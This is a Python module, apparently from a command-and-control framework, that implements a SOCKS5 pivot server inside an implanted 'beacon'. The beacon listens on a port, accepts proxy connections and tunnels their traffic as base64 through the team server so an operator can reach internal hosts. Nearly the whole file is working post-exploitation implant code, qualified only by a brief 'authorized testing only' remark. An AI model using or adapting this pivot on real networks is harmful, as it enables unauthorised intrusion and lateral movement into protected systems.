"""SOCKS5 pivot server that runs inside the beacon.

Start a SOCKS5 CONNECT proxy on the beacon with `socks <port>`. Clients on the
operator's side (e.g. your browser/proxychains) point at the beacon's port; the
beacon relays each connection's TCP stream back through the C2 listener, which
dials the requested *internal* host and streams the bytes. This is the standard
C2 pivot pattern for reaching networks the operator cannot touch otherwise --
authorized testing only.

Supported: CONNECT, no auth, IPv4/hostname. No UDP-associate.
"""
import base64
import socket
import threading


def b64e(b):
    return base64.b64encode(b).decode()


class SocksServer:
    """Local SOCKS5 server on the beacon. One thread per proxied client."""

    def __init__(self, beacon, port):
        self.beacon = beacon
        self.port = port
        self.sock = None
        self.thread = None
        self.running = False
        self.sock_id = 0
        self.lock = threading.Lock()
        # registry of client sockets, keyed by conn_id, for _deliver_socks
        self.beacon._socks_clients = {}

    def _next_conn_id(self):
        with self.lock:
            self.sock_id += 1
            return f"{self.beacon.beacon_id}-{self.sock_id}"

    def start(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(("0.0.0.0", self.port))
        self.sock.listen(64)
        self.sock.settimeout(1.0)
        self.running = True
        self.thread = threading.Thread(target=self._accept_loop, daemon=True)
        self.thread.start()
        return self

    def stop(self):
        self.running = False
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass

    def _accept_loop(self):
        while self.running:
            try:
                conn, _ = self.sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            threading.Thread(target=self._handle_client, args=(conn,),
                             daemon=True).start()

    def _recv_request(self, client):
        """Read an SOCKS5 CONNECT request: VER,NMETHODS then ADDR,PORT."""
        hdr = client.recv(4)
        if len(hdr) < 4 or hdr[0] != 0x05:
            return None
        atyp = hdr[3]
        if atyp == 0x01:            # IPv4
            addr = socket.inet_ntoa(client.recv(4))
        elif atyp == 0x03:          # domain
            ln = client.recv(1)[0]
            addr = client.recv(ln).decode("latin1")
        elif atyp == 0x04:          # IPv6
            addr = socket.inet_ntop(socket.AF_INET6, client.recv(16))
        else:
            return None
        port_b = client.recv(2)
        port = struct_unpack_port(port_b)
        return addr, port

    def _handle_client(self, client):
        conn_id = None
        try:
            client.settimeout(30)
            v = client.recv(2)
            if len(v) < 2 or v[0] != 0x05:
                client.close(); return
            nmethods = v[1]
            if nmethods:
                client.recv(nmethods)
            client.sendall(b"\x05\x00")               # no-auth
            req = self._recv_request(client)
            if req is None:
                client.close(); return
            host, port = req
            conn_id = self._next_conn_id()
            self.beacon._socks_clients[conn_id] = client
            # ask the team server to dial the internal host
            self._post("/socks_open", {"conn_id": conn_id, "host": host,
                                       "port": port})
            client.sendall(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")
            # read loop: client -> team server
            self._read_loop(conn_id, client)
        except Exception:
            pass
        finally:
            if conn_id:
                self.beacon._socks_clients.pop(conn_id, None)
                self._post("/socks_close", {"conn_id": conn_id})
            try:
                client.close()
            except Exception:
                pass

    def _read_loop(self, conn_id, client):
        while True:
            try:
                data = client.recv(65536)
                if not data:
                    return
                chunk = b64e(data)
                ok = self._post("/socks", {"conn_id": conn_id, "data": chunk,
                                           "source": "client"})
                if not ok:
                    return
            except socket.timeout:
                continue
            except Exception:
                return

    def _post(self, path, payload):
        try:
            self.beacon._post(path, payload)
            return True
        except Exception:
            return False


def struct_unpack_port(b):
    if len(b) < 2:
        return 0
    return (b[0] << 8) | b[1]
